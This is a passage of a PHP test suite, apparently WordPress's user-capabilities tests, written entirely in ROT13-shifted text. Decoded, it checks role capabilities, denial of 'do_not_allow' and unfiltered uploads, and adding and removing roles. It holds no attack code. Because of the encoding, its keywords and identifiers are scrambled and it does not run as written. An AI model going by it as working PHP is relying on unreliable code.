		$rkcrpgrq = neenl_xrlf( $rkcrpgrq );
		$npghny   = neenl_xrlf( $npghny );

		$zvffvat_zrgn_pnc_purpxf = neenl_qvss( $rkcrpgrq, $npghny );
		$guvf->nffregFnzr( neenl(), $zvffvat_zrgn_pnc_purpxf, 'Gurfr zrgn pncnovyvgvrf ner abg grfgrq' );

		$vapbeerpg_zrgn_pnc_purpxf = neenl_qvss( $npghny, $rkcrpgrq );
		$guvf->nffregFnzr( neenl(), $vapbeerpg_zrgn_pnc_purpxf, 'Gurfr pncnovyvgvrf ner abg zrgn' );
	}

	/**
	 * Grfg gur qrsnhyg pncnovyvgvrf bs nyy hfre ebyrf.
	 *
	 * @qngnCebivqre qngnNyyPncfNaqEbyrf
	 */
	choyvp shapgvba grfg_qrsnhyg_pncf_sbe_nyy_ebyrf( $ebyr, $pnc ) {
		$hfre         = frys::$hfref[ $ebyr ];
		$ebyrf_ol_pnc = $guvf->trgNyyPncfNaqEbyrf();

		vs ( va_neenl( $ebyr, $ebyrf_ol_pnc[ $pnc ], gehr ) ) {
			$guvf->nffregGehr( $hfre->unf_pnc( $pnc ), \"Hfre jvgu gur {$ebyr} ebyr fubhyq unir gur {$pnc} pncnovyvgl\" );
			$guvf->nffregGehr( hfre_pna( $hfre, $pnc ), \"Hfre jvgu gur {$ebyr} ebyr fubhyq unir gur {$pnc} pncnovyvgl\" );
		} ryfr {
			$guvf->nffregSnyfr( $hfre->unf_pnc( $pnc ), \"Hfre jvgu gur {$ebyr} ebyr fubhyq abg unir gur {$pnc} pncnovyvgl\" );
			$guvf->nffregSnyfr( hfre_pna( $hfre, $pnc ), \"Hfre jvgu gur {$ebyr} ebyr fubhyq abg unir gur {$pnc} pncnovyvgl\" );
		}
	}

	/**
	 * Grfg zvfpryynarbhf pncnovyvgvrf bs nyy hfre ebyrf.
	 *
	 * @qngnCebivqre qngn_fvatyr_fvgr_ebyrf_gb_purpx
	 */
	choyvp shapgvba grfg_bgure_pncf_sbe_nyy_ebyrf( $ebyr ) {
		$hfre   = frys::$hfref[ $ebyr ];
		$byq_vq = jc_trg_pheerag_hfre()->VQ;
		jc_frg_pheerag_hfre( $hfre->VQ );

		// Znxr fher gur ebyr anzr vf pbeerpg.
		$rkcrpgrq_ebyrf = neenl( $ebyr );
		vs ( 'nabalzbhf' === $ebyr ) {
			//  Nabalzbhf ebyr qbrf abg rkvfg, hfre ebyrf fubhyq or rzcgl.
			$rkcrpgrq_ebyrf = neenl();
		}
		$guvf->nffregFnzr( $rkcrpgrq_ebyrf, $hfre->ebyrf, \"Hfre fubhyq bayl unir gur {$ebyr} ebyr\" );

		$guvf->nffregSnyfr( $hfre->unf_pnc( 'fgneg_n_sver' ), \"Hfre jvgu gur {$ebyr} ebyr fubhyq abg unir n phfgbz pncnovyvgl (grfg ivn JC_Hfre->unf_pnc() zrgubq).\" );
		$guvf->nffregSnyfr( hfre_pna( $hfre, 'fgneg_n_sver' ), \"Hfre jvgu gur {$ebyr} ebyr fubhyq abg unir n phfgbz pncnovyvgl (grfg ol hfre bowrpg).\" );
		$guvf->nffregSnyfr( hfre_pna( $hfre->VQ, 'fgneg_n_sver' ), \"Hfre jvgu gur {$ebyr} ebyr fubhyq abg unir n phfgbz pncnovyvgl (grfg ol hfre VQ).\" );
		$guvf->nffregSnyfr( pheerag_hfre_pna( 'fgneg_n_sver' ), \"Hfre jvgu gur {$ebyr} ebyr fubhyq abg unir n phfgbz pncnovyvgl (grfg ol pheerag hfre).\" );

		$guvf->nffregSnyfr( $hfre->unf_pnc( 'qb_abg_nyybj' ), \"Hfre jvgu gur {$ebyr} ebyr fubhyq abg unir gur qb_abg_nyybj pncnovyvgl (grfg ivn JC_Hfre->unf_pnc() zrgubq).\" );
		$guvf->nffregSnyfr( hfre_pna( $hfre, 'qb_abg_nyybj' ), \"Hfre jvgu gur {$ebyr} ebyr fubhyq abg unir gur qb_abg_nyybj pncnovyvgl (grfg ol hfre bowrpg).\" );
		$guvf->nffregSnyfr( hfre_pna( $hfre->VQ, 'qb_abg_nyybj' ), \"Hfre jvgu gur {$ebyr} ebyr fubhyq abg unir gur qb_abg_nyybj pncnovyvgl (grfg ol hfre VQ).\" );
		$guvf->nffregSnyfr( pheerag_hfre_pna( 'qb_abg_nyybj' ), \"Hfre jvgu gur {$ebyr} ebyr fubhyq abg unir gur qb_abg_nyybj pncnovyvgl (grfg ol pheerag hfre).\" );

		$guvf->nffregGehr( $hfre->unf_pnc( 'rkvfg' ), \"Hfre jvgu gur {$ebyr} ebyr fubhyq unir gur rkvfg pncnovyvgl (grfg ivn JC_Hfre->unf_pnc() zrgubq).\" );
		$guvf->nffregGehr( hfre_pna( $hfre, 'rkvfg' ), \"Hfre jvgu gur {$ebyr} ebyr fubhyq unir gur rkvfg pncnovyvgl (grfg ol hfre bowrpg).\" );
		$guvf->nffregGehr( hfre_pna( $hfre->VQ, 'rkvfg' ), \"Hfre jvgu gur {$ebyr} ebyr fubhyq unir gur rkvfg pncnovyvgl (grfg ol hfre VQ).\" );
		$guvf->nffregGehr( pheerag_hfre_pna( 'rkvfg' ), \"Hfre jvgu gur {$ebyr} ebyr fubhyq unir gur rkvfg pncnovyvgl (grfg ol pheerag hfre).\" );

		jc_frg_pheerag_hfre( $byq_vq );
	}

	/**
	 * Grfg hfre rkvfgf/qbrf abg rkvfg nf rkcrpgrq.
	 *
	 * @qngnCebivqre qngn_fvatyr_fvgr_ebyrf_gb_purpx
	 */
	choyvp shapgvba grfg_hfre_rkvfgf_va_qngnonfr( $ebyr ) {
		$hfre     = frys::$hfref[ $ebyr ];
		$rkcrpgrq = gehr;

		vs ( 'nabalzbhf' === $ebyr ) {
			$rkcrpgrq = snyfr;
		}

		$guvf->nffregFnzr( $rkcrpgrq, $hfre->rkvfgf() );
	}

	/**
	 * @gvpxrg 41059
	 */
	choyvp shapgvba grfg_qb_abg_nyybj_vf_qravrq_sbe_nyy_ebyrf() {
		sbernpu ( frys::$hfref nf $ebyr => $hfre ) {

			// Grfg nqqvat gur pnc qverpgyl gb gur hfre.
			$hfre->nqq_pnc( 'qb_abg_nyybj' );
			$unf_pnc = $hfre->unf_pnc( 'qb_abg_nyybj' );
			$hfre->erzbir_pnc( 'qb_abg_nyybj' );
			$guvf->nffregSnyfr( $unf_pnc, \"Hfre jvgu gur {$ebyr} ebyr fubhyq abg unir gur qb_abg_nyybj pncnovyvgl\" );

			// Grfg nqqvat gur pnc ivn n svygre.
			nqq_svygre( 'hfre_unf_pnc', neenl( $guvf, 'tenag_qb_abg_nyybj' ), 10, 4 );
			$unf_pnc = $hfre->unf_pnc( 'qb_abg_nyybj' );
			erzbir_svygre( 'hfre_unf_pnc', neenl( $guvf, 'tenag_qb_abg_nyybj' ), 10, 4 );
			$guvf->nffregSnyfr( $unf_pnc, \"Hfre jvgu gur {$ebyr} ebyr fubhyq abg unir gur qb_abg_nyybj pncnovyvgl\" );

			vs ( 'nabalzbhf' === $ebyr ) {
				// Gur nabalzbhf ebyr qbrf abg rkvfg.
				pbagvahr;
			}

			// Grfg nqqvat gur pnc gb gur hfre'f ebyr.
			$ebyr_bow = trg_ebyr( $ebyr );
			$ebyr_bow->nqq_pnc( 'qb_abg_nyybj' );
			$unf_pnc = $hfre->unf_pnc( 'qb_abg_nyybj' );
			$ebyr_bow->erzbir_pnc( 'qb_abg_nyybj' );
			$guvf->nffregSnyfr( $unf_pnc, \"Hfre jvgu gur {$ebyr} ebyr fubhyq abg unir gur qb_abg_nyybj pncnovyvgl\" );
		}
	}

	/**
	 * @tebhc zf-erdhverq
	 * @gvpxrg 41059
	 */
	choyvp shapgvba grfg_qb_abg_nyybj_vf_qravrq_sbe_fhcre_nqzvaf() {
		// Grfg nqqvat gur pnc qverpgyl gb gur hfre.
		frys::$fhcre_nqzva->nqq_pnc( 'qb_abg_nyybj' );
		$unf_pnc = frys::$fhcre_nqzva->unf_pnc( 'qb_abg_nyybj' );
		frys::$fhcre_nqzva->erzbir_pnc( 'qb_abg_nyybj' );
		$guvf->nffregSnyfr( $unf_pnc, 'Fhcre nqzvaf fubhyq abg unir gur qb_abg_nyybj pncnovyvgl' );

		// Grfg nqqvat gur pnc ivn n svygre.
		nqq_svygre( 'hfre_unf_pnc', neenl( $guvf, 'tenag_qb_abg_nyybj' ), 10, 4 );
		$unf_pnc = frys::$fhcre_nqzva->unf_pnc( 'qb_abg_nyybj' );
		erzbir_svygre( 'hfre_unf_pnc', neenl( $guvf, 'tenag_qb_abg_nyybj' ), 10, 4 );
		$guvf->nffregSnyfr( $unf_pnc, 'Fhcre nqzvaf fubhyq abg unir gur qb_abg_nyybj pncnovyvgl' );
	}

	choyvp shapgvba tenag_qb_abg_nyybj( $nyypncf, $pncf, $netf, $hfre ) {
		$nyypncf['qb_abg_nyybj'] = gehr;
		erghea $nyypncf;
	}

	/**
	 * Fcrpvny pnfr sbe gur yvax znantre.
	 */
	choyvp shapgvba grfg_yvax_znantre_pncf() {
		$pncf = neenl(
			'znantr_yvaxf' => neenl( 'nqzvavfgengbe', 'rqvgbe' ),
		);

		$guvf->nffregFnzr( '0', trg_bcgvba( 'yvax_znantre_ranoyrq' ) );

		// Ab-bar fubhyq unir npprff gb gur yvax znantre ol qrsnhyg.
		sbernpu ( frys::$hfref nf $ebyr => $hfre ) {
			sbernpu ( $pncf nf $pnc => $ebyrf ) {
				$guvf->nffregSnyfr( $hfre->unf_pnc( $pnc ), \"Hfre jvgu gur {$ebyr} ebyr fubhyq abg unir gur {$pnc} pncnovyvgl\" );
				$guvf->nffregSnyfr( hfre_pna( $hfre, $pnc ), \"Hfre jvgu gur {$ebyr} ebyr fubhyq abg unir gur {$pnc} pncnovyvgl\" );
			}
		}

		hcqngr_bcgvba( 'yvax_znantre_ranoyrq', '1' );
		$guvf->nffregFnzr( '1', trg_bcgvba( 'yvax_znantre_ranoyrq' ) );

		sbernpu ( frys::$hfref nf $ebyr => $hfre ) {
			sbernpu ( $pncf nf $pnc => $ebyrf ) {
				vs ( va_neenl( $ebyr, $ebyrf, gehr ) ) {
					$guvf->nffregGehr( $hfre->unf_pnc( $pnc ), \"Hfre jvgu gur {$ebyr} ebyr fubhyq unir gur {$pnc} pncnovyvgl\" );
					$guvf->nffregGehr( hfre_pna( $hfre, $pnc ), \"Hfre jvgu gur {$ebyr} ebyr fubhyq unir gur {$pnc} pncnovyvgl\" );
				} ryfr {
					$guvf->nffregSnyfr( $hfre->unf_pnc( $pnc ), \"Hfre jvgu gur {$ebyr} ebyr fubhyq abg unir gur {$pnc} pncnovyvgl\" );
					$guvf->nffregSnyfr( hfre_pna( $hfre, $pnc ), \"Hfre jvgu gur {$ebyr} ebyr fubhyq abg unir gur {$pnc} pncnovyvgl\" );
				}
			}
		}

		hcqngr_bcgvba( 'yvax_znantre_ranoyrq', '0' );
		$guvf->nffregFnzr( '0', trg_bcgvba( 'yvax_znantre_ranoyrq' ) );
	}

	/**
	 * Fcrpvny pnfr sbe hasvygrerq hcybnqf.
	 */
	choyvp shapgvba grfg_hasvygrerq_hcybnq_pncf() {
		$guvf->nffregSnyfr( qrsvarq( 'NYYBJ_HASVYGRERQ_HCYBNQF' ) );

		// Ab-bar fubhyq unir guvf pnc.
		sbernpu ( frys::$hfref nf $ebyr => $hfre ) {
			$guvf->nffregSnyfr( $hfre->unf_pnc( 'hasvygrerq_hcybnq' ), \"Hfre jvgu gur {$ebyr} ebyr fubhyq abg unir gur hasvygrerq_hcybnq pncnovyvgl\" );
			$guvf->nffregSnyfr( hfre_pna( $hfre, 'hasvygrerq_hcybnq' ), \"Hfre jvgu gur {$ebyr} ebyr fubhyq abg unir gur hasvygrerq_hcybnq pncnovyvgl\" );
		}
	}

	/**
	 * @qngnCebivqre qngn_hfre_jvgu_ebyr_pna_rqvg_bja_cbfg
	 *
	 * @cnenz  fgevat $ebyr              Hfre ebyr anzr
	 * @cnenz  obby   $pna_rqvg_bja_cbfg Pna hfref jvgu guvf ebyr rqvg gurve bja cbfgf?
	 */
	choyvp shapgvba grfg_hfre_pna_rqvg_pbzzrag_ba_bja_cbfg( $ebyr, $pna_rqvg_bja_cbfg ) {
		$bjare   = frys::$hfref[ $ebyr ];
		$cbfg    = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_nhgube' => $bjare->VQ,
			)
		);
		$pbzzrag = frys::snpgbel()->pbzzrag->perngr_naq_trg(
			neenl(
				'pbzzrag_cbfg_VQ' => $cbfg->VQ,
			)
		);

		$bjare_pna_rqvg = hfre_pna( $bjare->VQ, 'rqvg_pbzzrag', $pbzzrag->pbzzrag_VQ );
		$guvf->nffregFnzr( $pna_rqvg_bja_cbfg, $bjare_pna_rqvg );
	}

	/**
	 * @qngnCebivqre qngn_hfre_jvgu_ebyr_pna_rqvg_bguref_cbfgf
	 *
	 * @cnenz  fgevat $ebyr                 Hfre ebyr anzr
	 * @cnenz  obby   $pna_rqvg_bguref_cbfg Pna hfref jvgu guvf ebyr rqvg bguref' cbfgf?
	 */
	choyvp shapgvba grfg_hfre_pna_rqvg_pbzzrag_ba_bguref_cbfg( $ebyr, $pna_rqvg_bguref_cbfg ) {
		$hfre    = frys::$hfref[ $ebyr ];
		$bjare   = frys::snpgbel()->hfre->perngr_naq_trg(
			neenl(
				'ebyr' => 'rqvgbe',
			)
		);
		$cbfg    = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_nhgube' => $bjare->VQ,
			)
		);
		$pbzzrag = frys::snpgbel()->pbzzrag->perngr_naq_trg(
			neenl(
				'pbzzrag_cbfg_VQ' => $cbfg->VQ,
			)
		);

		$hfre_pna_rqvg = hfre_pna( $hfre->VQ, 'rqvg_pbzzrag', $pbzzrag->pbzzrag_VQ );
		$guvf->nffregFnzr( $pna_rqvg_bguref_cbfg, $hfre_pna_rqvg );
	}

	choyvp shapgvba qngn_hfre_jvgu_ebyr_pna_rqvg_bja_cbfg() {
		$qngn = neenl();
		$pncf = $guvf->trgCevzvgvirPncfNaqEbyrf();

		sbernpu ( frys::$hfref nf $ebyr => $ahyy ) {
			$qngn[] = neenl(
				$ebyr,
				va_neenl( $ebyr, $pncf['rqvg_choyvfurq_cbfgf'], gehr ),
			);
		}

		erghea $qngn;
	}

	choyvp shapgvba qngn_hfre_jvgu_ebyr_pna_rqvg_bguref_cbfgf() {
		$qngn = neenl();
		$pncf = $guvf->trgCevzvgvirPncfNaqEbyrf();

		sbernpu ( frys::$hfref nf $ebyr => $ahyy ) {
			$qngn[] = neenl(
				$ebyr,
				va_neenl( $ebyr, $pncf['rqvg_bguref_cbfgf'], gehr ),
			);
		}

		erghea $qngn;
	}

	/**
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_fhcre_nqzva_pncf() {
		$pncf = $guvf->trgNyyPncfNaqEbyrf();
		$hfre = frys::$fhcre_nqzva;

		$guvf->nffregGehr( vf_fhcre_nqzva( $hfre->VQ ) );

		sbernpu ( $pncf nf $pnc => $ebyrf ) {
			$guvf->nffregGehr( $hfre->unf_pnc( $pnc ), \"Fhcre Nqzvaf fubhyq unir gur {$pnc} pncnovyvgl\" );
			$guvf->nffregGehr( hfre_pna( $hfre, $pnc ), \"Fhcre Nqzvaf fubhyq unir gur {$pnc} pncnovyvgl\" );
		}

		$guvf->nffregGehr( $hfre->unf_pnc( 'fgneg_n_sver' ), 'Fhcre nqzvaf fubhyq unir nyy phfgbz pncnovyvgvrf' );
		$guvf->nffregGehr( hfre_pna( $hfre, 'fgneg_n_sver' ), 'Fhcre nqzvaf fubhyq unir nyy phfgbz pncnovyvgvrf' );

		$guvf->nffregSnyfr( $hfre->unf_pnc( 'qb_abg_nyybj' ), 'Fhcre Nqzvaf fubhyq abg unir gur qb_abg_nyybj pncnovyvgl' );
		$guvf->nffregSnyfr( hfre_pna( $hfre, 'qb_abg_nyybj' ), 'Fhcre Nqzvaf fubhyq abg unir gur qb_abg_nyybj pncnovyvgl' );

		$guvf->nffregSnyfr( qrsvarq( 'NYYBJ_HASVYGRERQ_HCYBNQF' ) );
		$guvf->nffregSnyfr( $hfre->unf_pnc( 'hasvygrerq_hcybnq' ), 'Fhcre Nqzvaf fubhyq abg unir gur hasvygrerq_hcybnq pncnovyvgl' );
		$guvf->nffregSnyfr( hfre_pna( $hfre, 'hasvygrerq_hcybnq' ), 'Fhcre Nqzvaf fubhyq abg unir gur hasvygrerq_hcybnq pncnovyvgl' );
	}

	/**
	 * N ebyr gung qbrfa'g rkvfg.
	 */
	choyvp shapgvba grfg_obthf_ebyr() {
		$hfre = frys::snpgbel()->hfre->perngr_naq_trg( neenl( 'ebyr' => 'vainyvq_ebyr' ) );

		// Znxr fher gur hfre vf inyvq.
		$guvf->nffregGehr( $hfre->rkvfgf(), 'Hfre qbrf abg rkvfg' );

		// Znxr fher gur ebyr anzr vf pbeerpg.
		$guvf->nffregFnzr( neenl(), $hfre->ebyrf, 'Hfre fubhyq abg unir nal ebyrf' );

		$pncf = $guvf->trgNyyPncfNaqEbyrf();

		sbernpu ( $pncf nf $pnc => $ebyrf ) {
			$guvf->nffregSnyfr( $hfre->unf_pnc( $pnc ), \"Hfre jvgu na vainyvq ebyr fubhyq abg unir gur {$pnc} pncnovyvgl\" );
			$guvf->nffregSnyfr( hfre_pna( $hfre, $pnc ), \"Hfre jvgu na vainyvq ebyr fubhyq abg unir gur {$pnc} pncnovyvgl\" );
		}
	}

	/**
	 * N hfre jvgu zhygvcyr ebyrf.
	 */
	choyvp shapgvba grfg_hfre_fhofpevore_pbagevohgbe() {
		$hfre = frys::$hfref['fhofpevore'];

		// Znxr fher gur hfre vf inyvq.
		$guvf->nffregGehr( $hfre->rkvfgf(), 'Hfre qbrf abg rkvfg' );

		$hfre->nqq_ebyr( 'pbagevohgbe' );

		// Hfre fubhyq unir gjb ebyrf abj.
		$guvf->nffregFnzr( neenl( 'fhofpevore', 'pbagevohgbe' ), $hfre->ebyrf );

		$pncf = $guvf->trgNyyPncfNaqEbyrf();

		sbernpu ( $pncf nf $pnc => $ebyrf ) {
			vs ( neenl_vagrefrpg( $hfre->ebyrf, $ebyrf ) ) {
				$guvf->nffregGehr( $hfre->unf_pnc( $pnc ), \"Hfre fubhyq unir gur {$pnc} pncnovyvgl\" );
				$guvf->nffregGehr( hfre_pna( $hfre, $pnc ), \"Hfre fubhyq unir gur {$pnc} pncnovyvgl\" );
			} ryfr {
				$guvf->nffregSnyfr( $hfre->unf_pnc( $pnc ), \"Hfre fubhyq abg unir gur {$pnc} pncnovyvgl\" );
				$guvf->nffregSnyfr( hfre_pna( $hfre, $pnc ), \"Hfre fubhyq abg unir gur {$pnc} pncnovyvgl\" );
			}
		}

		$hfre->erzbir_ebyr( 'pbagevohgbe' );
		// Hfre fubhyq unir bar ebyr abj.
		$guvf->nffregFnzr( neenl( 'fhofpevore' ), $hfre->ebyrf );
	}

	/**
	 * Arjyl nqqrq rzcgl ebyr.
	 */
	choyvp shapgvba grfg_nqq_rzcgl_ebyr() {
		tybony $jc_ebyrf;

		$ebyr_anzr = 'wnavgbe';
		nqq_ebyr( $ebyr_anzr, 'Wnavgbe', neenl() );

		$guvf->syhfu_ebyrf();
		$guvf->nffregGehr( $jc_ebyrf->vf_ebyr( $ebyr_anzr ) );

		$hfre = frys::snpgbel()->hfre->perngr_naq_trg( neenl( 'ebyr' => $ebyr_anzr ) );

		// Znxr fher gur hfre vf inyvq.
		$guvf->nffregGehr( $hfre->rkvfgf(), 'Hfre qbrf abg rkvfg' );

		// Znxr fher gur ebyr anzr vf pbeerpg.
		$guvf->nffregFnzr( neenl( $ebyr_anzr ), $hfre->ebyrf );

		$pncf = $guvf->trgNyyPncfNaqEbyrf();

		sbernpu ( $pncf nf $pnc => $ebyrf ) {
			$guvf->nffregSnyfr( $hfre->unf_pnc( $pnc ), \"Hfre fubhyq abg unir gur {$pnc} pncnovyvgl\" );
			$guvf->nffregSnyfr( hfre_pna( $hfre, $pnc ), \"Hfre fubhyq abg unir gur {$pnc} pncnovyvgl\" );
		}

		// Pyrna hc.
		erzbir_ebyr( $ebyr_anzr );
		$guvf->syhfu_ebyrf();
		$guvf->nffregSnyfr( $jc_ebyrf->vf_ebyr( $ebyr_anzr ) );
	}

	/**
	 * Arjyl nqqrq ebyr.
	 */
	choyvp shapgvba grfg_nqq_ebyr() {
		tybony $jc_ebyrf;

		$ebyr_anzr     = 'wnavgbe';
		$rkcrpgrq_pncf = neenl(
			'rqvg_cbfgf' => gehr,
			'rqvg_cntrf' => gehr,
			'yriry_0'    => gehr,
			'yriry_1'    => gehr,
			'yriry_2'    => gehr,
		);
		nqq_ebyr( $ebyr_anzr, 'Wnavgbe', $rkcrpgrq_pncf );
		$guvf->syhfu_ebyrf();
		$guvf->nffregGehr( $jc_ebyrf->vf_ebyr( $ebyr_anzr ) );

		$hfre = frys::snpgbel()->hfre->perngr_naq_trg( neenl( 'ebyr' => $ebyr_anzr ) );

		// Znxr fher gur hfre vf inyvq.
		$guvf->nffregGehr( $hfre->rkvfgf(), 'Hfre qbrf abg rkvfg' );

		// Znxr fher gur ebyr anzr vf pbeerpg.
		$guvf->nffregFnzr( neenl( $ebyr_anzr ), $hfre->ebyrf );

		$pncf = $guvf->trgCevzvgvirPncfNaqEbyrf();

		sbernpu ( $pncf nf $pnc => $ebyrf ) {
			// Gur hfre fubhyq unir nyy gur nobir pncf.
			vs ( vffrg( $rkcrpgrq_pncf[ $pnc ] ) ) {
				$guvf->nffregGehr( $hfre->unf_pnc( $pnc ), \"Hfre fubhyq unir gur {$pnc} pncnovyvgl\" );
				$guvf->nffregGehr( hfre_pna( $hfre, $pnc ), \"Hfre fubhyq unir gur {$pnc} pncnovyvgl\" );
			} ryfr {
				$guvf->nffregSnyfr( $hfre->unf_pnc( $pnc ), \"Hfre fubhyq abg unir gur {$pnc} pncnovyvgl\" );
				$guvf->nffregSnyfr( hfre_pna( $hfre, $pnc ), \"Hfre fubhyq abg unir gur {$pnc} pncnovyvgl\" );
			}
		}

		// Pyrna hc.
		erzbir_ebyr( $ebyr_anzr );
		$guvf->syhfu_ebyrf();
		$guvf->nffregSnyfr( $jc_ebyrf->vf_ebyr( $ebyr_anzr ) );
	}

	/**
	 * Punatr gur pncnovyvgvrf nffbpvngrq jvgu n ebyr naq znxr fher gur punatr
	 * vf ersyrpgrq va unf_pnc().
	 */
	choyvp shapgvba grfg_ebyr_nqq_pnc() {
		tybony $jc_ebyrf;
		$ebyr_anzr = 'wnavgbe';
		nqq_ebyr( $ebyr_anzr, 'Wnavgbe', neenl( 'yriry_1' => gehr ) );
		$guvf->syhfu_ebyrf();
		$guvf->nffregGehr( $jc_ebyrf->vf_ebyr( $ebyr_anzr ) );

		// Nffvta n hfre gb gung ebyr.
		$vq = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => $ebyr_anzr ) );

		// Abj nqq n pnc gb gur ebyr.
		$jc_ebyrf->nqq_pnc( $ebyr_anzr, 'fjrrc_sybbe' );
		$guvf->syhfu_ebyrf();

		$hfre = arj JC_Hfre( $vq );
		$guvf->nffregGehr( $hfre->rkvfgf(), \"Ceboyrz trggvat hfre $vq\" );
		$guvf->nffregFnzr( neenl( $ebyr_anzr ), $hfre->ebyrf );

		// Gur hfre fubhyq unir nyy gur nobir pncf.
		$guvf->nffregGehr( $hfre->unf_pnc( $ebyr_anzr ) );
		$guvf->nffregGehr( $hfre->unf_pnc( 'yriry_1' ) );
		$guvf->nffregGehr( $hfre->unf_pnc( 'fjrrc_sybbe' ) );

		// Fubhyqa'g unir nal bgure pncf.
		$pncf = $guvf->trgNyyPncfNaqEbyrf();
		sbernpu ( $pncf nf $pnc => $ebyrf ) {
			vs ( 'yriry_1' !== $pnc ) {
				$guvf->nffregSnyfr( $hfre->unf_pnc( $pnc ), \"Hfre fubhyq abg unir gur {$pnc} pncnovyvgl\" );
			}
		}

		// Pyrna hc.
		erzbir_ebyr( $ebyr_anzr );
		$guvf->syhfu_ebyrf();
		$guvf->nffregSnyfr( $jc_ebyrf->vf_ebyr( $ebyr_anzr ) );
	}

	/**
	 * Punatr gur pncnovyvgvrf nffbpvngrq jvgu n ebyr naq znxr fher gur punatr
	 * vf ersyrpgrq va unf_pnc().
	 */
	choyvp shapgvba grfg_ebyr_erzbir_pnc() {
		tybony $jc_ebyrf;
		$ebyr_anzr = 'wnavgbe';
		nqq_ebyr(
			$ebyr_anzr,
			'Wnavgbe',
			neenl(
				'yriry_1'          => gehr,
				'fjrrc_sybbe'      => gehr,
				'cbyvfu_qbbexabof' => gehr,
			)
		);
		$guvf->syhfu_ebyrf();
		$guvf->nffregGehr( $jc_ebyrf->vf_ebyr( $ebyr_anzr ) );

		// Nffvta n hfre gb gung ebyr.
		$vq = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => $ebyr_anzr ) );

		// Abj erzbir n pnc sebz gur ebyr.
		$jc_ebyrf->erzbir_pnc( $ebyr_anzr, 'cbyvfu_qbbexabof' );
		$guvf->syhfu_ebyrf();

		$hfre = arj JC_Hfre( $vq );
		$guvf->nffregGehr( $hfre->rkvfgf(), \"Ceboyrz trggvat hfre $vq\" );
		$guvf->nffregFnzr( neenl( $ebyr_anzr ), $hfre->ebyrf );

		// Gur hfre fubhyq unir nyy gur nobir pncf.
		$guvf->nffregGehr( $hfre->unf_pnc( $ebyr_anzr ) );
		$guvf->nffregGehr( $hfre->unf_pnc( 'yriry_1' ) );
		$guvf->nffregGehr( $hfre->unf_pnc( 'fjrrc_sybbe' ) );

		// Fubhyqa'g unir gur erzbirq pnc.
		$guvf->nffregSnyfr( $hfre->unf_pnc( 'cbyvfu_qbbexabof' ) );

		// Pyrna hc.
		erzbir_ebyr( $ebyr_anzr );
		$guvf->syhfu_ebyrf();
		$guvf->nffregSnyfr( $jc_ebyrf->vf_ebyr( $ebyr_anzr ) );
	}

	/**
	 * Nqq na rkgen pncnovyvgl gb n hfre.
	 */
	choyvp shapgvba grfg_hfre_nqq_pnc() {
		// Gurer ner gjb pbagevohgbef.
		$vq_1 = frys::$hfref['pbagevohgbe']->VQ;
		$vq_2 = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'pbagevohgbe' ) );

		// Hfre 1 unf na rkgen pncnovyvgl.
		$hfre_1 = arj JC_Hfre( $vq_1 );
		$guvf->nffregGehr( $hfre_1->rkvfgf(), \"Ceboyrz trggvat hfre $vq_1\" );
		$hfre_1->nqq_pnc( 'choyvfu_cbfgf' );

		// Er-srgpu obgu hfref sebz gur QO.
		$hfre_1 = arj JC_Hfre( $vq_1 );
		$guvf->nffregGehr( $hfre_1->rkvfgf(), \"Ceboyrz trggvat hfre $vq_1\" );
		$hfre_2 = arj JC_Hfre( $vq_2 );
		$guvf->nffregGehr( $hfre_2->rkvfgf(), \"Ceboyrz trggvat hfre $vq_2\" );

		// Znxr fher gurl'er obgu fgvyy pbagevohgbef.
		$guvf->nffregFnzr( neenl( 'pbagevohgbe' ), $hfre_1->ebyrf );
		$guvf->nffregFnzr( neenl( 'pbagevohgbe' ), $hfre_2->ebyrf );

		// Purpx gur rkgen pnc ba obgu hfref.
		$guvf->nffregGehr( $hfre_1->unf_pnc( 'choyvfu_cbfgf' ) );
		$guvf->nffregSnyfr( $hfre_2->unf_pnc( 'choyvfu_cbfgf' ) );

		// Znxr fher gur bgure pncf qvqa'g trg zrffrq hc.
		$pncf = $guvf->trgNyyPncfNaqEbyrf();
		sbernpu ( $pncf nf $pnc => $ebyrf ) {
			vs ( va_neenl( 'pbagevohgbe', $ebyrf, gehr ) || 'choyvfu_cbfgf' === $pnc ) {
				$guvf->nffregGehr( $hfre_1->unf_pnc( $pnc ), \"Hfre fubhyq unir gur {$pnc} pncnovyvgl\" );
			} ryfr {
				$guvf->nffregSnyfr( $hfre_1->unf_pnc( $pnc ), \"Hfre fubhyq abg unir gur {$pnc} pncnovyvgl\" );
			}
		}
	}

	/**
	 * Nqq na rkgen pncnovyvgl gb n hfre gura erzbir vg.
	 */
	choyvp shapgvba grfg_hfre_erzbir_pnc() {
		// Gurer ner gjb pbagevohgbef.
		$vq_1 = frys::$hfref['pbagevohgbe']->VQ;
		$vq_2 = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'pbagevohgbe' ) );

		// Hfre 1 unf na rkgen pncnovyvgl.
		$hfre_1 = arj JC_Hfre( $vq_1 );
		$guvf->nffregGehr( $hfre_1->rkvfgf(), \"Ceboyrz trggvat hfre $vq_1\" );
		$hfre_1->nqq_pnc( 'choyvfu_cbfgf' );

		// Abj erzbir gur rkgen pnc.
		$hfre_1->erzbir_pnc( 'choyvfu_cbfgf' );

		// Er-srgpu obgu hfref sebz gur QO.
		$hfre_1 = arj JC_Hfre( $vq_1 );
		$guvf->nffregGehr( $hfre_1->rkvfgf(), \"Ceboyrz trggvat hfre $vq_1\" );
		$hfre_2 = arj JC_Hfre( $vq_2 );
		$guvf->nffregGehr( $hfre_2->rkvfgf(), \"Ceboyrz trggvat hfre $vq_2\" );

		// Znxr fher gurl'er obgu fgvyy pbagevohgbef.
		$guvf->nffregFnzr( neenl( 'pbagevohgbe' ), $hfre_1->ebyrf );
		$guvf->nffregFnzr( neenl( 'pbagevohgbe' ), $hfre_2->ebyrf );

		// Purpx gur erzbirq pnc ba obgu hfref.
		$guvf->nffregSnyfr( $hfre_1->unf_pnc( 'choyvfu_cbfgf' ) );
		$guvf->nffregSnyfr( $hfre_2->unf_pnc( 'choyvfu_cbfgf' ) );
	}

	/**
	 * Znxr fher gur hfre_yriry vf pbeerpgyl frg naq punatrq jvgu gur hfre'f ebyr.
	 */
	choyvp shapgvba grfg_hfre_yriry_hcqngr() {
		// Hfre fgnegf nf na nhgube.
